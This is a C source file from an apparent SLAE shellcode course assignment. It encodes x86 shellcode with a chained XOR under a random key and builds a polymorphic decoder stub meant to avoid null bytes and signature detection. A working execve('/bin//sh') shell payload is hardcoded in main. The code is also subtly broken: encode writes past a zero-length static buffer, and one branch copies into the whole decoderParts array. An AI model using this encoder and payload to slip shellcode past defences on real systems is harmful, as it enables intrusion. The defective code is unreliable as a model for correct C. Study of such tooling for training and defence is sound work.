/* Filename    : encoder.c
 * Author      : Joris Hartog
 * Date        : 17-12-2015
 * Student     : SLAE-704
 * Description : This program encodes by XOR'ing each byte of the 
 *  original shellcode with the previous result. The first byte 
 *  is XOR'ed with a key.
 */

#include <stdio.h>
#include <string.h>
#include <stdlib.h>
#include <time.h>

typedef enum {false, true} bool;

bool containsNulls(char *shellcode, int length) {
	if ( strlen(shellcode) == length)
		return false;
	else
		return true;
}

char* encode(char *shellcode, char key) {
	static char encodedCode[] = "";

	int i;
	encodedCode[0] = shellcode[0]^key;
	for(i = 1; i < strlen(shellcode); i++) {
		encodedCode[i] = shellcode[i]^encodedCode[i-1];
	}

	return encodedCode;
}

char* appendString(char str1[], char str2[]) {
	static char *answer;

	if((answer = malloc(strlen(str1)+strlen(str2)+1)) != NULL) {
		answer[0] = '\0';
		strcat(answer, str1);
		strcat(answer, str2);
	} else {
		printf("[!] Error: malloc failed!\n");
	}

	return answer;
}

char* polymorphicDecoder(char key, int codeLength) {
	printf("     Initialising decoder stub..\n");
	char decoderParts[19][10] = 
	{
		"\xeb\x1e",
		"\x90",
		"\x5e",
		"\x31\xc0",
		"\xb0\xaa",
		"\x31\xc9",
		"\xb1\xaa",
		"\x8a\x1e",
		"\x32\x06",
		"\x88\x06",
		"\x88\xda",
		"\x83\xc6\x01",
		"\x8a\x1e",
		"\x30\x16",
		"\x49",
		"\x75\xf4",
		"\xeb\x06",
		"\x90",
		"\xe8\xdc\xff\xff\xff"
	};

	printf("     Setting key..\n");
	decoderParts[4][1] = key;

	printf("     Setting code length..\n");
	decoderParts[6][1] = (unsigned char)(codeLength - 1);

	printf("     Creating polymorphic version..\n");
	if (0b00000001 & key) {
		strcpy(decoderParts[3], "\x6a\xaa");
		strcpy(decoderParts[4], "\x58");
		decoderParts[3][1] = key;

		decoderParts[0][1] -= 1;
		decoderParts[18][1] += 1;
	} else if (0b00000010 & key) {
		strcpy(decoderParts[5], "\x6a\xaa");
		strcpy(decoderParts[6], "\x59");
		decoderParts[5][1] = (unsigned char)(codeLength - 1);

		decoderParts[0][1] -= 1;
		decoderParts[18][1] += 1;
	} else if (0b00000100 & key) {
		strcpy(decoderParts[7], "\x8a\x16");
		strcpy(decoderParts[10], "\x88\xd3");
		strcpy(decoderParts[12], "\x8a\x16");
		strcpy(decoderParts[13], "\x30\x1e");
	} else if (0b00001000 & key) {
		strcpy(decoderParts[8], "\x30\x06");
		decoderParts[9][0] = '\0';

		decoderParts[0][1] -= 2;
		decoderParts[18][1] += 2;
	} else if (0b00010000 & key) {
		strcpy(decoderParts[11], "\x46");

		decoderParts[0][1] -= 2;
		decoderParts[18][1] += 2;
		decoderParts[15][1] += 2;
	} else if (0b00100000 & key) {
		strcpy(decoderParts, "\x2e\xf7");
		decoderParts[14][1] = decoderParts[15][1];
		decoderParts[15][0] = '\0';

		decoderParts[0][1] -= 2;
		decoderParts[18][1] += 2;
	} else if (0b01000000 & key) {
		decoderParts[1][0] = '\0';

		decoderParts[0][1] -= 1;
		decoderParts[18][1] += 1;
	} else if (0b10000000 & key) {
		strcpy(decoderParts[16], "\xeb\x05");
		decoderParts[17][0] = '\0';

		decoderParts[0][1] -= 1;
		decoderParts[18][1] += 1;
	}
/*
 8048060:  0      eb 1e           ;!;     Set to correct memory!
 8048062:  1      90              ;7;     ...
 8048063:  2      5e
 8048064:  3      31 c0           ;1;     6a aa
 8048066:  4      b0 aa           ;1;     58
 8048068:  5      31 c9           ;2;     6a aa
 804806a:  6      b1 aa           ;2;     59
 804806c:  7      8a 1e           ;3;     8a 16
 804806e:  8      32 06           ;4;     30 06
 8048070:  9      88 06           ;4;     ...
 8048072: 10      88 da           ;3;     88 d3
 8048074: 11      83 c6 01        ;5;     46
 8048077: 12      8a 1e           ;3;     8a 16
 8048079: 13      30 16           ;3;     30 1e
 804807b: 14      49              ;6;     e2 f7
 804807c: 15      75 f4           ;6;     ...
 804807e: 16      eb 06           ;8;     eb 05
 8048080: 17      90              ;8;     ...
 8048081: 18      e8 dc ff ff ff  ;!;     Set to correct memory!
*/
	printf("     Forming string..\n");

	static char stub[50];
	sprintf(stub, "%s%s%s%s%s"\
		      "%s%s%s%s%s"\
		      "%s%s%s%s%s"\
		      "%s%s%s%s",
		decoderParts[0],
		decoderParts[1],
		decoderParts[2],
		decoderParts[3],
                decoderParts[4],
                decoderParts[5],
                decoderParts[6],
                decoderParts[7],
                decoderParts[8],
                decoderParts[9],
                decoderParts[10],
                decoderParts[11],
                decoderParts[12],
                decoderParts[13],
                decoderParts[14],
                decoderParts[15],
                decoderParts[16],
                decoderParts[17],
                decoderParts[18]);
        
	printf("     Done!\n");
        
	return stub;
}

char createKey() {
	char key = (char)( rand() % 0x100 );
	return key;
}

void showUsage(char *name) {
	printf("Usage  : %s [shellcode]\n", name);
	printf("Example: %s \\x12\\x34\\x56\\x78\\x90\\xab\\xcd\\xef\n", name);
}

int main(int argc, char *argv[]) {
	// Check if number of arguments is correct
	if(argc != 2) {
		showUsage(argv[0]);
		return 0;
	}

	// Import the shellcode
	printf("[*] Importing shellcode..\n");
	//char *shellcode = argv[1];
	char shellcode[] = \
	"\x31\xc0\x50\x89\xe2\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x53\x89\xe1\xb0\x0b\xcd\x80";
	int length = strlen(shellcode);
	char *encodedShellcode;

	// Seed random number generator with the current time
	printf("[*] Seeding random number generator..\n");
	srand(time(NULL));

	// Encode shellcode with new keys until no the
	//  code contains no nulls.
	printf("[*] Encoding..\n");
	char key;
	do {
		// Get random key
		key = createKey();
		printf("     Key = 0x%02x\n", (0xFF & key));

		// Encode shellcode
		encodedShellcode = encode(shellcode, key);
	} while (containsNulls(encodedShellcode, length) == true);

	// Get polymorphic decoder stub
	printf("[*] Creating polymorphic decoder-stub..\n");
	char *decoderStub = polymorphicDecoder(key, length);

	printf("[*] Done with decoder-stub of %d bytes and shellcode of %d bytes!\n", strlen(decoderStub), strlen(encodedShellcode));

	// Print decoder stub
	printf("[>] Decoder-stub: ");
	int i;
	for(i = 0; i < strlen(decoderStub); i++) {
		printf("0x%02x", (0xFF & decoderStub[i]));
		if (i+1 < strlen(decoderStub)) {
			printf(",");
		}
	}

	// Print encoded shellcode
	printf("\n[>] Shellcode: ");
	for(i = 0; i < strlen(encodedShellcode); i++) {
		printf("0x%02x", (0xFF & encodedShellcode[i]));
		if (i+1 < strlen(encodedShellcode)) {
			printf(",");
		}
	}
	printf("\nClean code:\n");
        for(i = 0; i < strlen(decoderStub); i++) {
                printf("\\x%02x", (0xFF & decoderStub[i]));
        }
        for(i = 0; i < strlen(encodedShellcode); i++) {
                printf("\\x%02x", (0xFF & encodedShellcode[i]));
        }

	printf("\n");
}

